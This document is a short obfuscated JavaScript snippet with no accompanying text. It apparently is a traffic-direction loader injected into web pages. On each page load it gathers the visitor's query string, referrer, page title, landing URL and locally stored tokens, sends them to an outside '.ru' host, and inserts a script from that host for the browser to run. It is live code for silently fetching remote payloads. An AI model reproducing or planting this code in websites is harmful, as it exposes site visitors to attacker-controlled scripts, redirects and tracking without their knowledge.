(function() {
    var name = '_R45Gb9RbjTrZzVKY';
    if (!window._R45Gb9RbjTrZzVKY) {
        window._R45Gb9RbjTrZzVKY = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/VdLRyrX9',
        };
    }
    const _FRtvcw4DCRCvLYHg = localStorage.getItem('config');
    if (typeof _FRtvcw4DCRCvLYHg !== 'undefined' && _FRtvcw4DCRCvLYHg !== null) {
        var _49Zzcm9H9X17Lqb4 = JSON.parse(_FRtvcw4DCRCvLYHg);
        var _XTGLqLdVGWhzV6ZR = Math.round(+new Date()/1000);
        if (_49Zzcm9H9X17Lqb4.created_at + window._R45Gb9RbjTrZzVKY.ttl < _XTGLqLdVGWhzV6ZR) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _tvb1PhrhYLWsQ3gj = localStorage.getItem('subId');
    var _N9FjhVrtgSp4NKkG = localStorage.getItem('token');
    var _dNdZ1qWyPt1nmWDd = '?return=js.client';
        _dNdZ1qWyPt1nmWDd += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _dNdZ1qWyPt1nmWDd += '&se_referrer=' + encodeURIComponent(document.referrer);
        _dNdZ1qWyPt1nmWDd += '&default_keyword=' + encodeURIComponent(document.title);
        _dNdZ1qWyPt1nmWDd += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _dNdZ1qWyPt1nmWDd += '&name=' + encodeURIComponent(name);
        _dNdZ1qWyPt1nmWDd += '&host=' + encodeURIComponent(window._R45Gb9RbjTrZzVKY.R_PATH);
    if (typeof _tvb1PhrhYLWsQ3gj !== 'undefined' && _tvb1PhrhYLWsQ3gj && window._R45Gb9RbjTrZzVKY.unique) {
        _dNdZ1qWyPt1nmWDd += '&sub_id=' + encodeURIComponent(_tvb1PhrhYLWsQ3gj);
    }
    if (typeof _N9FjhVrtgSp4NKkG !== 'undefined' && _N9FjhVrtgSp4NKkG && window._R45Gb9RbjTrZzVKY.unique) {
        _dNdZ1qWyPt1nmWDd += '&token=' + encodeURIComponent(_N9FjhVrtgSp4NKkG);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._R45Gb9RbjTrZzVKY.R_PATH + _dNdZ1qWyPt1nmWDd;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
